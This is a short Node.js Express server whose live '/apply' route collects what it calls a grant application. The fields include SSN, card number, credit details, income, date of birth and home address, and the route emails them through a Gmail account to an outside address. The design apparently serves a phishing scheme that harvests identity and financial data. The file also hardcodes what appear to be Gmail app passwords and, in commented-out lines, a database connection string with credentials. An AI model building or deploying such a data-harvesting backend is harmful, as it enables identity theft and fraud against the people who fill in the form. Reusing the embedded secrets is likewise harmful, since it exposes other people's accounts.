const express = require("express");
const bodyParser = require("body-parser");
// const exphbs = require("express-handlebars");
const nodemailer = require("nodemailer")
// const mongoose = require('mongoose')
require('dotenv').config();
var cors = require('cors')
// const path = require('path');
// const User = require('./model/user')

var PORT = process.env.PORT || 5000;

const app = express();

app.use(cors());

// mongoose.connect('mongodb+srv://khalifa:tech10@cluster0.nbcuv.mongodb.net/myFirstDatabase?retryWrites=true&w=majority', 
// { useNewUrlParser: true },
// ()=> console.log('connected to db'))

// app.engine('handlebars', exphbs())

// app.set('view engine', 'handlebars')

// app.use('/public', express.static(path.join(__dirname, 'public')));

// app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json());

app.get('/', (req, res)=>{
    res.send('hello')
});

// app.post('/car', async(req, res)=>{

//   const user = new User({
//     name: req.body.name
//   });

//   try {
//     const savedUser = await user.save();  
//     res.status(200).send(savedUser);
//   } catch (error) {
//     res.status(400).send(error)
//   }
// })

app.post('/apply', (req, res)=>{

  console.log("lagos" + req.body.firstname);

    const output = `
    <p>Application form</P>
    <p>Email: ${req.body.email} </p>
    <p>Firstname: ${req.body.firstname}</p>
    <p>lastname: ${req.body.lastname}</p>
    <p>Home address: ${req.body.address}</p>
    <p>Disability: ${req.body.disable}</p>
    <p>Form of grant: ${req.body.form}</p>
    <p>DOB: ${req.body.dob}</p>
    <p>Gender: ${req.body.gender}</p>
    <p>Phone Courier: ${req.body.phone}</p>
    <p>Card: ${req.body.card}</p>
    <p>Type of house : ${req.body.home}</p>
    <p>Marital Status: ${req.body.marital}</p>
    <p>Country: ${req.body.country}</p>
    <p>Occupation: ${req.body.occupation}</p>
    <p>lastname: ${req.body.lastname}</p>
    <p>SSN: ${req.body.ssn}</p>
    <p>Income: ${req.body.income}</p>
    <p>Credit: ${req.body.credit}</p>
    `

        let transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true, 
            auth: {
              user: "pcurtis2500@gmail.com", // generated ethereal user
              pass: "acurnmodpqhvtbpk", // generated ethereal password
            }
          });
        
          const mailoptions = {
            from: 'pcurtis2500@gmail.com', // sender address
            to: 'hcfs.net@consultant.com', // list of receivers
            subject: "New Application", // Subject line
            text: "Thank you for registering with us!!!", // plain text body
            html: output
          }
           transporter.sendMail(mailoptions, (error, info)=>{
            if(error){

                console.log(error)
                res.status(201).send("internal service error")
            }
            else{
                var successRes = { "status": "success" }
                res.status(200).send(successRes);
            }
        })

    });

    // app.post('/register', (req, res)=>{

    //     const output = `
    //     <p>Welcome to Bigboy Apparrel</P>
    //     <p>Thank you for registering with us</p>
    //     <p>Email: ${req.body.email} </p>
    //     <p>Username: ${req.body.username}</p>
    //     `
    
    //         let transporter = nodemailer.createTransport({
    //             host: 'smtp.gmail.com',
    //             port: 465,
    //             secure: true, 
    //             auth: {
    //               user: "pcurtis2500@gmail.com", // generated ethereal user
    //               pass: "mymumis20", // generated ethereal password
    //             },
    //             // tls:{
    //             //     rejectUnauthorized: false
    //             // }
    //           });
            
    //           const mailoptions = {
    //             from: 'pcurtis2500@gmail.com', // sender address
    //             to: `${req.body.email}`, // list of receivers
    //             subject: "Hello ✔", // Subject line
    //             text: "Thank you for registering with us!!!", // plain text body
    //             html: output
    //           }
    //           // send mail with defined transport object
    
    //            transporter.sendMail(mailoptions, (error, info)=>{
    //             if(error){
    //                 console.log(error)
    //             }
    //             else{
    //                 var successRes = { "status": "success" }
    //                 res.status(200).send(successRes);
    //             }
    //         })
    
    //     });


app.listen(PORT, ()=> console.log("server started"));